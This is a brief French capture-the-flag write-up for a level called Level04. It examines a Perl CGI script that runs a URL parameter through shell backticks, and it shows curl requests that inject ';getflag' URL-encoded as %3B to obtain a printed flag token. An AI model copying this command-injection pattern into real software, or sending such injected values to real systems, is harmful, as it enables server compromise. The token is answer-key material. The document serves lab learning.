# Level04:

```
ls
```

Un fichier en perl : `level04.pl`

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Je vois `CGI` qui est un protocole permettant d'exécuter des scripts via des requêtes web
`sub` permet de definir une fonction en perl ici: `x`
`$y` est ce que l'utilisateur passe dans l 'url
ici la faille c'est que les backticks signifient Exécute cette commande shell
Cette fonction prend en argument ce que l'utilisateur passe 
J'essaie:
```bash
 curl http://localhost:4747?x=hello
 ```

output: `hello`

essayons de getflag

```bash
curl http://localhost:4747?x=;getflag
```
output:
```
no token here
```

le probleme c'est que `;` a été interprete par notre teminal du coup ca donne quelque chose comme:

```bash
http://localhost:4747?x=

getflag
```

La solution c'est d'encoder `;` selon la norme URL ici  ; = %3B

essayons:

```bash
curl http://localhost:4747?x=%3Bgetflag
```

```
output: Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
